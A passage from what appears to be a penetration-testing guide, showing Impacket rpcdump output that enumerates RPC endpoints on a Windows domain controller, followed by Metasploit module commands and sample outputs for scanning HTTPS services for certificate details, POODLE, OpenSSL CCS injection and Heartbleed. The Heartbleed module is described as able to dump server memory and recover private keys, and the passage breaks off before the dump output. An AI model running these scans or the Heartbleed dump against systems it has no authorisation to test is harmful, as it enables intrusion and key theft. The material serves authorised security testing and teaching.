<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcdump.py 10.10.xx.xx
</span><span class='line'>Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
</span><span class='line'>
</span><span class='line'>[*] Retrieving endpoint list from 10.10.xx.xx
</span><span class='line'>[*] Trying protocol 135/TCP...
</span><span class='line'>Protocol: N/A     
</span><span class='line'>Provider: iphlpsvc.dll 
</span><span class='line'>UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: schedsvc.dll 
</span><span class='line'>UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: nsisvc.dll 
</span><span class='line'>UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-37912a0de47813b4b3]
</span><span class='line'>          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-CMPO]: MSDTC Connection Manager: 
</span><span class='line'>Provider: msdtcprx.dll 
</span><span class='line'>UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>          ncalrpc:[LRPC-316e773cde064c1ede]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: dhcpcsvc6.dll 
</span><span class='line'>UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[dhcpcsvc6]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: nrpsrv.dll 
</span><span class='line'>UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-RSP]: Remote Shutdown Protocol 
</span><span class='line'>Provider: wininit.exe 
</span><span class='line'>UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49152]
</span><span class='line'>          ncalrpc:[WindowsShutdown]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\InitShutdown]
</span><span class='line'>          ncalrpc:[WMsgKRpc07EB30]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: authui.dll 
</span><span class='line'>UUID    : 24019106-A203-4642-B88D-82DAE9158929 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-21f4d30ba4239e8f6e]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: gpsvc.dll 
</span><span class='line'>UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: BFE.DLL 
</span><span class='line'>UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: schedsvc.dll 
</span><span class='line'>UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : A00C021C-2BE2-11D2-B678-0000F87A8F8E v1.0 PERFMON SERVICE
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
</span><span class='line'>Provider: ntdsai.dll 
</span><span class='line'>UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: taskcomp.dll 
</span><span class='line'>UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
</span><span class='line'>Provider: dns.exe 
</span><span class='line'>UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49166]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
</span><span class='line'>Provider: taskcomp.dll 
</span><span class='line'>UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 Spooler function endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: keyiso.dll 
</span><span class='line'>UUID    : B25A52BF-E5DD-4F4A-AEA6-8CA7272A0E86 v1.0 KeyIso
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FRS1]: File Replication Service Protocol 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : D049B186-814F-11D1-9A3C-00C04FC9B232 v1.1 NtFrs API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
</span><span class='line'>Provider: samsrv.dll 
</span><span class='line'>UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
</span><span class='line'>Provider: services.exe 
</span><span class='line'>UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49168]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FRS1]: File Replication Service Protocol 
</span><span class='line'>Provider: ntfrs.exe 
</span><span class='line'>UUID    : F5CC59B4-4264-101A-8C59-08002B2F8426 v1.1 NtFrs Service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-77115559ab3225edd1]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49161]
</span><span class='line'>          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: IKEEXT.DLL 
</span><span class='line'>UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: winlogon.exe 
</span><span class='line'>UUID    : 12E65DD8-887F-41EF-91BF-8D816C42C2E7 v1.0 Secure Desktop LRPC interface
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[WMsgKRpc0530E42]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: dhcpcsvc.dll 
</span><span class='line'>UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[dhcpcsvc]
</span><span class='line'>          ncalrpc:[dhcpcsvc6]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-ICPR]: ICertPassage Remote Protocol 
</span><span class='line'>Provider: certsrv.exe 
</span><span class='line'>UUID    : 91AE6020-9E3C-11CF-8D7C-00AA00C091BE v0.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49197]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\cert]
</span><span class='line'>          ncalrpc:[OLEC5F09EAC9DB745C58B8411EC2BA2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : AE33069B-A2A8-46EE-A235-DDFD339BE281 v1.0 Spooler base remote object endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[spoolss]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: MPSSVC.dll 
</span><span class='line'>UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: sysntfy.dll 
</span><span class='line'>UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-8e5134e25ee9203de8]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: srvsvc.dll 
</span><span class='line'>UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
</span><span class='line'>Provider: wevtsvc.dll 
</span><span class='line'>UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49153]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\eventlog]
</span><span class='line'>          ncalrpc:[eventlog]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: N/A 
</span><span class='line'>UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\W32TIME_ALT]
</span><span class='line'>          ncalrpc:[W32TIME_ALT]
</span><span class='line'>          ncalrpc:[LRPC-37912a0de47813b4b3]
</span><span class='line'>          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: winlogon.exe 
</span><span class='line'>UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[WMsgKRpc07ED51]
</span><span class='line'>          ncalrpc:[WindowsShutdown]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\InitShutdown]
</span><span class='line'>          ncalrpc:[WMsgKRpc07EB30]
</span><span class='line'>          ncalrpc:[WMsgKRpc0530E42]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
</span><span class='line'>Provider: FwRemoteSvr.dll 
</span><span class='line'>UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49176]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-RPRN]: Print System Remote Protocol 
</span><span class='line'>Provider: spoolsv.exe 
</span><span class='line'>UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0 IPSec Policy agent endpoint
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-dbe8204e618ba8177d]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49176]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: certprop.dll 
</span><span class='line'>UUID    : 30B044A5-A225-43F0-B3A4-E060DF91F9C1 v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\srvsvc]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49154]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\atsvc]
</span><span class='line'>          ncalrpc:[senssvc]
</span><span class='line'>          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
</span><span class='line'>          ncalrpc:[IUserProfile2]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
</span><span class='line'>Provider: lsasrv.dll 
</span><span class='line'>UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: [MS-NRPC]: Netlogon Remote Protocol 
</span><span class='line'>Provider: netlogon.dll 
</span><span class='line'>UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
</span><span class='line'>Bindings: 
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49158]
</span><span class='line'>          ncacn_http:10.10.xx.xx[49157]
</span><span class='line'>          ncalrpc:[NTDS_LPC]
</span><span class='line'>          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
</span><span class='line'>          ncacn_ip_tcp:10.10.xx.xx[49155]
</span><span class='line'>          ncalrpc:[samss lpc]
</span><span class='line'>          ncalrpc:[dsrole]
</span><span class='line'>          ncacn_np:\\ADS[\PIPE\protected_storage]
</span><span class='line'>          ncalrpc:[protected_storage]
</span><span class='line'>          ncalrpc:[lsasspirpc]
</span><span class='line'>          ncalrpc:[lsapolicylookup]
</span><span class='line'>          ncalrpc:[LSARPC_ENDPOINT]
</span><span class='line'>          ncalrpc:[securityevent]
</span><span class='line'>          ncalrpc:[audit]
</span><span class='line'>          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
</span><span class='line'>          ncacn_np:\\ADS[\pipe\lsass]
</span><span class='line'>
</span><span class='line'>Protocol: N/A 
</span><span class='line'>Provider: MPSSVC.dll 
</span><span class='line'>UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
</span><span class='line'>Bindings: 
</span><span class='line'>          ncalrpc:[LRPC-5409763072e46c4586]
</span><span class='line'>
</span><span class='line'>[*] Received 189 endpoints.</span></code></pre></td></tr></table></div></figure>


<h3>HTTPS | Port 443 and 8443</h3>

<p><strong>Metasploit</strong> has below modules which we found useful are</p>

<ol>
<li><strong>HTTP SSL Certificate Information</strong> which parses the server SSL certificate to obtain the common name and 
  signature algorithm.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/ssl
</span><span class='line'>services -p 443 -u -R</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:443 Subject: /OU=Domain Control Validated/CN=www.example.com
</span><span class='line'>[*] 10.10.xx.xx:443 Issuer: /C=US/ST=Arizona/L=Scottsdale/O=GoDaddy.com, Inc./OU=http://certs.godaddy.com/repository//CN=Go Daddy Secure Certificate Authority - G2
</span><span class='line'>[*] 10.10.xx.xx:443 Signature Alg: sha256WithRSAEncryption
</span><span class='line'>[*] 10.10.xx.xx:443 Public Key Size: 2048 bits
</span><span class='line'>[*] 10.10.xx.xx:443 Not Valid Before: 2016-01-12 10:01:38 UTC
</span><span class='line'>[*] 10.10.xx.xx:443 Not Valid After: 2017-02-26 09:13:38 UTC
</span><span class='line'>[+] 10.10.xx.xx:443 Certificate contains no CA Issuers extension... possible self signed certificate
</span><span class='line'>[*] 10.10.xx.xx:443 has common name www.example.com
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>

and</li>
<li> <strong>HTTP SSL/TLS Version Detection (POODLE scanner)</strong>. If a web server can successfully establish an SSLv3 session, it is likely to be vulnerable to the POODLE attack.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/http/ssl_version</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 accepts SSLv3</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>OpenSSL Server-Side ChangeCipherSpec Injection Scanner</strong> which checks for the OpenSSL ChangeCipherSpec (CCS) Injection vulnerability. The problem exists in the handling of early CCS messages during session negotiation. There's a NSE for the same ssl-ccs-injection.nse.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssl/openssl_ccs</span></code></pre></td></tr></table></div></figure></li>

<li><strong>OpenSSL Heartbeat (Heartbleed) Information Leak</strong> which is implements the OpenSSL Heartbleed attack. The module supports several 
  actions, allowing for scanning, dumping of memory contents, and private key recovery. It has three Actions: SCAN, KEYS, DUMP which scans the host for the vulnerablity, scan for the private keys and dump the memory of the host. 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssl/openssl_heartbleed </span></code></pre></td></tr></table></div></figure>

SCAN Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Heartbeat response with leak</span></code></pre></td></tr></table></div></figure>

DUMP Sample Output:
